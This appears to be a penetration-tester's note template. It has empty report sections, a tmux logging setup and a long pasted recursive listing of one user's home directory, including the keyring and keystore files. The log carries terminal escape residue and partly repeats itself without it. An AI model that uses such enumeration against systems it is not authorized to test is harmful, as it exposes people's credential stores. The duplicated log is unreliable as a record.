---
MOC: "[[Offensive Security Concepts MOC]]"
---
---

While these notes can be compiled into a writeup or a [[Penetration Test Report Template|report]], this section is primarily for you. Delete placeholder information where needed. This is where the summary for the report goes.

# Attack Path
This is where an outline of the entire compromise path. Use screenshots and command output where applicable.
# Credentials

| User | Password |
| ---- | -------- |
|      |          |
# Service Enumeration
This section covers which services you've checked, both failed and successful. This can include things about the service, like subdomains, and vulnerabilities.
# Artifacts
If anything needs to be cleaned up by the client, it should be listed here. This includes when and where for service accounts and system changes. It is useful to provide a hash for files.
# Administrative Information
This is for information about the client, like contact information, specific objectives, rules, and scope.
# Activity Log
Overview of everything done for the test. Don't cut console output for the notes, only the report.
## Setup tmux for logging
Use prefix (`Ctrl+B`) and `Shift+I` to install plugins, `Shift+P` to start logging, and `Alt+P` to capture screen output.
```shell
git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm
tee -a .tmux.conf << 'EOF'
set -g @plugin 'tmux-plugins/tpm' 
set -g @plugin 'tmux-plugins/tmux-sensible' 
set -g @plugin 'tmux-plugins/tmux-logging' 
set -g history-limit 50000
# Initialize TMUX plugin manager (keep at bottom) 
run '~/.tmux/plugins/tpm/tpm'
EOF
tmux source ~/.tmux.conf
```

- [ ] Nmap scanning
- [ ] exploit everything

```log
: ESCOB./.local:
: ESCOBtotal 16
: ESCOBdrwx------  4 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-x--- 15 jonathan jonathan 4096 Mar 20 12:28 ..
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 share
: ESCOBdrwx------  3 jonathan jonathan 4096 Mar 20 11:38 state
: ESCOB
: ESCOB./.local/share:
: ESCOBtotal 56
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------  4 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwx------  2 jonathan jonathan 4096 Mar 20 11:38 applications
: ESCOBdrwx------  7 jonathan jonathan 4096 Mar 20 11:38 evolution
: ESCOBdrwxr-xr-x  3 jonathan jonathan 4096 Mar 20 11:38 flatpak
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 gnome-settings-daemon
: ESCOBdrwx------  2 jonathan jonathan 4096 Mar 20 11:38 gnome-shell
: ESCOBdrwx------  2 jonathan jonathan 4096 Mar 20 11:38 gvfs-metadata
: ESCOBdrwxrwxr-x  2 jonathan jonathan 4096 Mar 20 11:38 ibus-table
: ESCOBdrwxrwxr-x  2 jonathan jonathan 4096 Mar 20 11:38 icc
: ESCOBdrwx------  2 jonathan jonathan 4096 Mar 20 11:38 keyrings
: ESCOBdrwxr-xr-x  3 jonathan jonathan 4096 Mar 20 11:38 nautilus
: ESCOB-rw-rw-r--  1 jonathan jonathan  184 Mar 18 17:14 session_migration-ubuntu
: ESCOBdrwx------  2 jonathan jonathan 4096 Mar 20 11:38 sounds
: ESCOB
: ESCOB./.local/share/applications:
: ESCOBtotal 8
: ESCOBdrwx------  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./.local/share/evolution:
: ESCOBtotal 28
: ESCOBdrwx------  7 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxrwxr-x  4 jonathan jonathan 4096 Mar 20 11:38 addressbook
: ESCOBdrwxrwxr-x  4 jonathan jonathan 4096 Mar 20 11:38 calendar
: ESCOBdrwxrwxr-x  3 jonathan jonathan 4096 Mar 20 11:38 mail
: ESCOBdrwxrwxr-x  3 jonathan jonathan 4096 Mar 20 11:38 memos
: ESCOBdrwxrwxr-x  4 jonathan jonathan 4096 Mar 20 11:38 tasks
: ESCOB
: ESCOB./.local/share/evolution/addressbook:
: ESCOBtotal 16
: ESCOBdrwxrwxr-x 4 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 7 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwx------ 3 jonathan jonathan 4096 Mar 20 11:38 system
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 trash
: ESCOB
: ESCOB./.local/share/evolution/addressbook/system:
: ESCOBtotal 104
: ESCOBdrwx------ 3 jonathan jonathan  4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 4 jonathan jonathan  4096 Mar 20 11:38 ..
: ESCOB-rw-r--r-- 1 jonathan jonathan 94208 Mar 20 10:58 contacts.db
: ESCOBdrwx------ 2 jonathan jonathan  4096 Mar 20 11:38 photos
: ESCOB
: ESCOB./.local/share/evolution/addressbook/system/photos:
: ESCOBtotal 8
: ESCOBdrwx------ 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 3 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./.local/share/evolution/addressbook/trash:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 4 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./.local/share/evolution/calendar:
: ESCOBtotal 16
: ESCOBdrwxrwxr-x 4 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 7 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwx------ 2 jonathan jonathan 4096 Mar 20 11:38 system
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 trash
: ESCOB
: ESCOB./.local/share/evolution/calendar/system:
: ESCOBtotal 12
: ESCOBdrwx------ 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 4 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB-rw-rw-r-- 1 jonathan jonathan  173 Mar 20 10:51 calendar.ics
: ESCOB
: ESCOB./.local/share/evolution/calendar/trash:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 4 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./.local/share/evolution/mail:
: ESCOBtotal 12
: ESCOBdrwxrwxr-x 3 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 7 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 trash
: ESCOB
: ESCOB./.local/share/evolution/mail/trash:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 3 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./.local/share/evolution/memos:
: ESCOBtotal 12
: ESCOBdrwxrwxr-x 3 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 7 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 trash
: ESCOB
: ESCOB./.local/share/evolution/memos/trash:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 3 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./.local/share/evolution/tasks:
: ESCOBtotal 16
: ESCOBdrwxrwxr-x 4 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 7 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwx------ 2 jonathan jonathan 4096 Mar 20 11:38 system
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 trash
: ESCOB
: ESCOB./.local/share/evolution/tasks/system:
: ESCOBtotal 12
: ESCOBdrwx------ 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 4 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB-rw-rw-r-- 1 jonathan jonathan  173 Mar 18 17:14 tasks.ics
: ESCOB
: ESCOB./.local/share/evolution/tasks/trash:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 4 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./.local/share/flatpak:
: ESCOBtotal 12
: ESCOBdrwxr-xr-x  3 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 db
: ESCOB
: ESCOB./.local/share/flatpak/db:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 3 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./.local/share/gnome-settings-daemon:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB-rw-rw-r--  1 jonathan jonathan    0 Mar 18 17:14 input-sources-converted
: ESCOB
: ESCOB./.local/share/gnome-shell:
: ESCOBtotal 12
: ESCOBdrwx------  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB-rw-rw-r--  1 jonathan jonathan  263 Mar 18 17:19 application_state
: ESCOB-rw-rw-r--  1 jonathan jonathan    0 Mar 18 17:14 update-check-46
: ESCOB
: ESCOB./.local/share/gvfs-metadata:
: ESCOBtotal 80
: ESCOBdrwx------  2 jonathan jonathan  4096 Mar 20 11:38 .
: ESCOBdrwx------ 13 jonathan jonathan  4096 Mar 20 11:38 ..
: ESCOB-rw-------  1 jonathan jonathan   112 Mar 20 10:52 home
: ESCOB-rw-rw-r--  1 jonathan jonathan 32768 Mar 20 10:52 home-f2b2d3cf.log
: ESCOB-rw-------  1 jonathan jonathan    64 Mar 20 10:58 root
: ESCOB-rw-rw-r--  1 jonathan jonathan 32768 Mar 20 10:58 root-c3fa72a1.log
: ESCOB
: ESCOB./.local/share/ibus-table:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./.local/share/icc:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./.local/share/keyrings:
: ESCOBtotal 16
: ESCOBdrwx------  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB-rw-------  1 jonathan jonathan  105 Mar 18 17:14 login.keyring
: ESCOB-rw-------  1 jonathan jonathan  207 Mar 18 17:14 user.keystore
: ESCOB
: ESCOB./.local/share/nautilus:
: ESCOBtotal 12
: ESCOBdrwxr-xr-x  3 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 tags
: ESCOB-rw-rw-r--  1 jonathan jonathan    0 Mar 18 17:14 tracker2-migration-complete
: ESCOB
: ESCOB./.local/share/nautilus/tags:
: ESCOBtotal 328
: ESCOBdrwxr-xr-x 2 jonathan jonathan   4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 3 jonathan jonathan   4096 Mar 20 11:38 ..
: ESCOB-rw-r--r-- 1 jonathan jonathan 303104 Mar 18 17:14 meta.db
: ESCOB-rw-rw-r-- 1 jonathan jonathan  23390 Mar 18 17:14 ontologies.gvdb
: ESCOB
: ESCOB./.local/share/sounds:
: ESCOBtotal 8
: ESCOBdrwx------  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 13 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./.local/state:
: ESCOBtotal 12
: ESCOBdrwx------ 3 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 4 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwx------ 2 jonathan jonathan 4096 Apr  4 21:37 wireplumber
: ESCOB
: ESCOB./.local/state/wireplumber:
: ESCOBtotal 12
: ESCOBdrwx------ 2 jonathan jonathan 4096 Apr  4 21:37 .
: ESCOBdrwx------ 3 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB-rw-rw-r-- 1 jonathan jonathan  417 Apr  4 21:37 restore-stream
: ESCOB
: ESCOB./Music:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-x--- 15 jonathan jonathan 4096 Mar 20 12:28 ..
: ESCOB
: ESCOB./Pictures:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-x--- 15 jonathan jonathan 4096 Mar 20 12:28 ..
: ESCOB
: ESCOB./Public:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-x--- 15 jonathan jonathan 4096 Mar 20 12:28 ..
: ESCOB
: ESCOB./snap:
: ESCOBtotal 12
: ESCOBdrwx------  3 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-x--- 15 jonathan jonathan 4096 Mar 20 12:28 ..
: ESCOBdrwxr-xr-x  4 jonathan jonathan 4096 Mar 20 11:38 snapd-desktop-integration
: ESCOB
: ESCOB./snap/snapd-desktop-integration:
: ESCOBtotal 16
: ESCOBdrwxr-xr-x  4 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------  3 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 178
: ESCOBdrwxr-xr-x  3 jonathan jonathan 4096 Mar 20 11:38 common
: ESCOBlrwxrwxrwx  1 jonathan jonathan    3 Mar 18 17:14 current -> 178
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178:
: ESCOBtotal 52
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x  4 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwx------  7 jonathan jonathan 4096 Mar 20 11:38 .config
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Desktop
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Documents
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Downloads
: ESCOB-rw-rw-r--  1 jonathan jonathan   31 Mar 18 17:14 .last_revision
: ESCOBdrwxrwxr-x  3 jonathan jonathan 4096 Mar 20 11:38 .local
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Music
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Pictures
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Public
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Templates
: ESCOBlrwxrwxrwx  1 jonathan jonathan   51 Mar 18 17:14 .themes -> /snap/snapd-desktop-integration/178/data-dir/themes
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 Videos
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/.config:
: ESCOBtotal 44
: ESCOBdrwx------  7 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxrwxr-x  2 jonathan jonathan 4096 Mar 20 11:38 dconf
: ESCOBdrwxrwxr-x  2 jonathan jonathan 4096 Mar 20 11:38 fontconfig
: ESCOBdrwxrwxr-x  2 jonathan jonathan 4096 Mar 20 11:38 gtk-2.0
: ESCOBdrwxrwxr-x  2 jonathan jonathan 4096 Mar 20 11:38 gtk-3.0
: ESCOBdrwxrwxr-x  2 jonathan jonathan 4096 Apr  4 21:37 ibus
: ESCOB-rw-------  1 jonathan jonathan  574 Mar 20 10:51 user-dirs.dirs
: ESCOB-rw-rw-r--  1 jonathan jonathan   36 Mar 18 17:14 user-dirs.dirs.md5sum
: ESCOB-rw-rw-r--  1 jonathan jonathan    5 Mar 18 17:14 user-dirs.locale
: ESCOB-rw-rw-r--  1 jonathan jonathan   36 Mar 18 17:14 user-dirs.locale.md5sum
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/.config/dconf:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 7 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBlrwxrwxrwx 1 jonathan jonathan   29 Mar 18 17:14 user -> /home/user/.config/dconf/user
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/.config/fontconfig:
: ESCOBtotal 12
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 7 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB-rw-rw-r-- 1 jonathan jonathan  415 Mar 18 17:14 fonts.conf
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/.config/gtk-2.0:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 7 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBlrwxrwxrwx 1 jonathan jonathan   45 Mar 18 17:14 gtkfilechooser.ini -> /home/user/.config/gtk-2.0/gtkfilechooser.ini
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/.config/gtk-3.0:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwx------ 7 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBlrwxrwxrwx 1 jonathan jonathan   36 Mar 18 17:14 bookmarks -> /home/user/.config/gtk-3.0/bookmarks
: ESCOBlrwxrwxrwx 1 jonathan jonathan   34 Mar 18 17:14 gtk.css -> /home/user/.config/gtk-3.0/gtk.css
: ESCOBlrwxrwxrwx 1 jonathan jonathan   39 Mar 18 17:14 settings.ini -> /home/user/.config/gtk-3.0/settings.ini
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/.config/ibus:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Apr  4 21:37 .
: ESCOBdrwx------ 7 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBlrwxrwxrwx 1 jonathan jonathan   31 Apr  4 21:37 bus -> /home/jonathan/.config/ibus/bus
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/Desktop:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/Documents:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/Downloads:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/.local:
: ESCOBtotal 12
: ESCOBdrwxrwxr-x  3 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxrwxr-x  4 jonathan jonathan 4096 Mar 20 11:38 share
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/.local/share:
: ESCOBtotal 16
: ESCOBdrwxrwxr-x 4 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 3 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxrwxr-x 3 jonathan jonathan 4096 Mar 20 11:38 glib-2.0
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 icons
: ESCOBlrwxrwxrwx 1 jonathan jonathan   51 Mar 18 17:14 themes -> /snap/snapd-desktop-integration/178/data-dir/themes
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/.local/share/glib-2.0:
: ESCOBtotal 12
: ESCOBdrwxrwxr-x 3 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 4 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 schemas
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/.local/share/glib-2.0/schemas:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 3 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/.local/share/icons:
: ESCOBtotal 8
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxrwxr-x 4 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/Music:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/Pictures:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/Public:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/Templates:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./snap/snapd-desktop-integration/178/Videos:
: ESCOBtotal 8
: ESCOBdrwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOB
: ESCOB./snap/snapd-desktop-integration/common:
: ESCOBtotal 12
: ESCOBdrwxr-xr-x 3 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 4 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxrwxr-x 5 jonathan jonathan 4096 Mar 20 11:38 .cache
: ESCOB
: ESCOB./snap/snapd-desktop-integration/common/.cache:
: ESCOBtotal 24
: ESCOBdrwxrwxr-x 5 jonathan jonathan 4096 Mar 20 11:38 .
: ESCOBdrwxr-xr-x 3 jonathan jonathan 4096 Mar 20 11:38 ..
: ESCOBdrwxr-xr-x 2 jonathan jonathan 4096 Mar 20 12:09 fontconfig
: ESCOB-rw-rw-r-- 1 jonathan jonathan 3900 Mar 18 17:14 gdk-pixbuf-loaders.cache
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 gio-modules
: ESCOBdrwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 immodules
: ESCOB
: ESCOB./snap/snapd-desktop-integration/common/.cache/fontconfig:
: ESCOBtotal 1248
: ESCOBdrwxr-xr-x 2 jonathan jonathan   4096 Mar 20 12:09 .
: ESCOBdrwxrwxr-x 5 jonathan jonathan   4096 Mar 20 11:38 ..
: ESCOB-rw-rw-r-- 1 jonathan jonathan 424496 Mar 20 12:09 0bd3dc0958fa2205aaaa8ebb13e2872b-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    240 Mar 18 17:14 1212c216f2033a5ec8fa17872a31a831-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan 336968 Mar 20 12:09 2300eef321c393bfd76478a5c0e95b23-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan  27232 Mar 20 12:09 3047814df9a2f067bd2d96a2b9c36e5a-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    104 Mar 20 12:09 32b6488e5b8292a2e95c79d947e009e8-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    312 Mar 20 12:09 3830d5c3ddfd5cd38a049b759396e72e-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan   3368 Mar 20 12:09 3f7329c5293ffd510edef78f73874cfd-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan  15904 Mar 18 17:14 4bb91bf3032869ac3c085cd082e059c3-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    104 Mar 20 12:09 4c599c202bc5c08e2d34565a40eac3b2-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    200 Mar 20 12:09 573ec803664ed168555e0e8b6d0f0c7f-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    104 Mar 20 12:09 57e423e26b20ab21d0f2f29c145174c3-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    120 Mar 20 12:09 6333f38776742d18e214673cd2c24e34-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    352 Mar 18 17:14 674b004966039230fa975147097c9563-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan  55112 Mar 20 12:09 6cc790b63b123a6a96ee260fcdad32a9-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    160 Mar 20 12:09 707971e003b4ae6c8121c3a920e507f5-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan   2864 Mar 18 17:14 70bf6984fc7ed9edcbc39bf4a996b2a6-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    336 Mar 20 12:09 7ef2298fde41cc6eeb7af42e48b7d293-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan  62800 Mar 20 12:09 9b89f8e3dae116d678bbf48e5f21f69b-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan  44064 Mar 20 12:09 a4e60e8d1e10d2fdff3fe3037a1845fb-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    264 Mar 20 12:09 c855463f699352c367813e37f3f70ea7-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan 145768 Mar 20 12:09 cabbd14511b9e8a55e92af97fb3a0461-le64.cache-7
: ESCOB-rw-r--r-- 1 jonathan jonathan    200 Mar 18 17:14 CACHEDIR.TAG
: ESCOB-rw-rw-r-- 1 jonathan jonathan  19480 Mar 20 12:09 d589a48862398ed80a3d6066f4f56f4c-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan    152 Mar 20 12:09 d82eb4fd963d448e2fcb7d7b793b5df3-le64.cache-7
: ESCOB-rw-rw-r-- 1 jonathan jonathan  54056 Mar 20 12:09 e13b20fdb08344e0e664864cc2ede53d-le64.cache-7
drwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..

./snap/snapd-desktop-integration/178/Videos:
total 8
drwxr-xr-x  2 jonathan jonathan 4096 Mar 20 11:38 .
drwxr-xr-x 12 jonathan jonathan 4096 Mar 20 11:38 ..

./snap/snapd-desktop-integration/common:
total 12
drwxr-xr-x 3 jonathan jonathan 4096 Mar 20 11:38 .
drwxr-xr-x 4 jonathan jonathan 4096 Mar 20 11:38 ..
drwxrwxr-x 5 jonathan jonathan 4096 Mar 20 11:38 .cache

./snap/snapd-desktop-integration/common/.cache:
total 24
drwxrwxr-x 5 jonathan jonathan 4096 Mar 20 11:38 .
drwxr-xr-x 3 jonathan jonathan 4096 Mar 20 11:38 ..
drwxr-xr-x 2 jonathan jonathan 4096 Mar 20 12:09 fontconfig
-rw-rw-r-- 1 jonathan jonathan 3900 Mar 18 17:14 gdk-pixbuf-loaders.cache
drwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 gio-modules
drwxrwxr-x 2 jonathan jonathan 4096 Mar 20 11:38 immodules

./snap/snapd-desktop-integration/common/.cache/fontconfig:
total 1248
drwxr-xr-x 2 jonathan jonathan   4096 Mar 20 12:09 .
drwxrwxr-x 5 jonathan jonathan   4096 Mar 20 11:38 ..
-rw-rw-r-- 1 jonathan jonathan 424496 Mar 20 12:09 0bd3dc0958fa2205aaaa8ebb13e2872b-le64.cache-7
-rw-rw-r-- 1 jonathan jonathan    240 Mar 18 17:14 1212c216f2033a5ec8fa17872a31a831-le64.cache-7
-rw-rw-r-- 1 jonathan jonathan 336968 Mar 20 12:09 2300eef321c393bfd76478a5c0e95b23-le64.cache-7
-rw-rw-r-- 1 jonathan jonathan  27232 Mar 20 12:09 3047814df9a2f067bd2d96a2b9c36e5a-le64.cache-7
